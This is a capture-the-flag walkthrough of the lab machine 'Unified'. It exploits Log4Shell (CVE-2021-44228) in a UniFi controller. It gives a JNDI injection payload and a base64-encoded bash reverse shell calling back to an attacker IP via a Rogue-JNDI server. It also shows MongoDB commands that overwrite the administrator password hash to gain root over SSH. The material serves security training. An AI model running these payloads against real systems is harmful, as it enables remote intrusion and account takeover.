# CTF Walkthrough: Unified

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Vulnerability Discovery](#3-vulnerability-discovery)
- [4. Exploitation](#4-exploitation)
- [5. Privilege Escalation](#5-privilege-escalation)

---

## 1. Introduction
 
**Category:** Log4j, Burpsuite, tcpdump, Rogue-JNDI, LDAP protocol, Reverse Shell, netcat, ps, MongoDB, mkpasswd, SSH
**Difficulty Level:** Very Easy   
**CVE(s) involved:** CVE-2021-44228

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Add to /etc/hosts**
    - Command: `sudo vim /etc/hosts`
    - Command: `10.129.96.149 unified.htb`

- **Running Services**
  - Command: `nmap -sC -sV 10.129.96.149`
      - Output: 
        ```
        PORT     STATE SERVICE         VERSION
        22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey:
        |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
        |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
        |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
        6789/tcp open  ibm-db2-admin?
        8080/tcp open  http            Apache Tomcat (language: en)
        |_http-open-proxy: Proxy might be redirecting requests
        |_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
        8443/tcp open  ssl/nagios-nsca Nagios NSCA
        | http-title: UniFi Network
        |_Requested resource was /manage/account/login?redirect=%2Fmanage
        | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
        | Subject Alternative Name: DNS:UniFi
        | Not valid before: 2021-12-30T21:37:24
        |_Not valid after:  2024-04-03T21:37:24
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 196.28 seconds
        ```
## 3. Vulnerability Discovery
- **Visiting the website**
    - Visit `http://unified.htb:8080`
    - UniFi 6.4.54 is vulnerable using Log4j exploit

## 4. Exploitation
- **Log4j Exploit**
    - Log in with random username and password, with Remember Me checked
    - Intercept unified.htb:8443 with Burpsuite
        - Output:
            ```
            POST /api/login HTTP/1.1

            Host: unified.htb:8443

            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
            Accept: */*
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate, br
            Referer: https://unified.htb:8443/manage/account/login?redirect=%2Fmanage
            Content-Type: application/json; charset=utf-8
            Content-Length: 67
            Origin: https://unified.htb:8443
            Sec-Fetch-Dest: empty
            Sec-Fetch-Mode: cors
            Sec-Fetch-Site: same-origin
            Priority: u=0
            Te: trailers
            Connection: keep-alive

            {"username":"test","password":"test","remember":true,"strict":true}
            ```
    - Send to Repeater
    - Replace "remember" POST request with:
        - `"remember":"${jndi:ldap://10.10.14.174/whatever}"`

    - Verify using tcpdump
        - Command: `sudo tcpdump -i tun0 port 389`
            - Output:
                ```
                listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
                22:03:22.134444 IP unified.htb.41416 > 10.10.14.174.ldap: Flags [S], seq 3754317506, win 64240, options [mss 1362,sackOK,TS val 98895062 ecr 0,nop,wscale 7], length 0
                22:03:22.134463 IP 10.10.14.174.ldap > unified.htb.41416: Flags [R.], seq 0, ack 3754317507, win 0, length 0
                ```
    - Create an encoded payload
        - Command: `echo 'bash -c bash -i >&/dev/tcp/10.10.14.174/1261 0>&1' | base64`
            - Output:
                ```
                YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTc0LzEyNjEgMD4mMQo=
                ```

    - Create payload with Rogue-jndi
        - Source: https://github.com/veracode-research/rogue-jndi
        - Install dependencies
            - Command: `sudo apt install openjdk-11-jdk`
            - Command: `sudo apt install maven`
        - Command: `cd rogue-jndi`
        - Command: `mvn package`

    - Reverse Shell
        - Start the server
            - Command: `java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTc0LzEyNjEgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.174"`
        - Start netcat
            - Command: `nc -lvnp 1261`
        - Send request in Burpsuite with
            - `"remember":"${jndi:ldap://<ATTACKING IP>:1389/o=tomcat}"`
        - Update terminal
            - Command: `script /dev/null -c bash`

- **User flag**
    - Command: `cat /home/michael/user.txt`
        - Output:
            ```
            6ced1a6a89e666c0620cdb10262ba127
            ```

## 5. Privilege Escalation
- **Getting Admin Password**
    - Command: `ps aux | grep mongo`
        - Output:
            ```
            unifi         67  0.3  4.1 1070976 85116 ?       Sl   13:58   0:18 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
            unifi       2605  0.0  0.0  11468  1000 pts/0    S+   15:30   0:00 grep mongo
            ```
    - Check MongoDB database
        - Command: `mongo ace --port 27117 --eval "db.admin.find().forEach(printjson);"`
            - Output:
                ```
                MongoDB server version: 3.6.3
                {
                        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
                        "name" : "administrator",
                        "email" : "administrator@unified.htb",
                        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
                        "time_created" : NumberLong(1640900495),
                        "last_site_name" : "default",
                ```

- **Changing Admin Password to "admin"**
    - Command: `mkpasswd -m sha512crypt admin`
        - Output:
            ```
            $6$F5G4iq2z1ctaDZgu$ALdDePm0Eim2yDM3zyFWN4.rZ/26n4/oS3kzCd/vJmrK/frDKw2YwtLJaXXCZIzv6Bm93rn0wB.14n/KjxCJM/
            ```


- **Update Admin Password**
    - Command: `mongo ace --port 27117 --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$F5G4iq2z1ctaDZgu$ALdDePm0Eim2yDM3zyFWN4.rZ/26n4/oS3kzCd/vJmrK/frDKw2YwtLJaXXCZIzv6Bm93rn0wB.14n/KjxCJM/"}})'`
        - Output:
            ```
            MongoDB shell version v3.6.3
            connecting to: mongodb://127.0.0.1:27117/ace
            MongoDB server version: 3.6.3
            WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
            ```

- **Log in as Administrator at unified.htb**
    - Username: administrator
    - Password: admin

- **Obtain SSH Credentials**
    - Settings > Site > Device Authentication
        - Username: root
        - Password: NotACrackablePassword4U2022

- **SSH**
    - Command: `ssh root@unified.htb`

- **Root Flag**
    - Command: `cat root.txt`
        - Output:
            ```
            e50bc93c75b634e4b272d2f771c33681
            ```

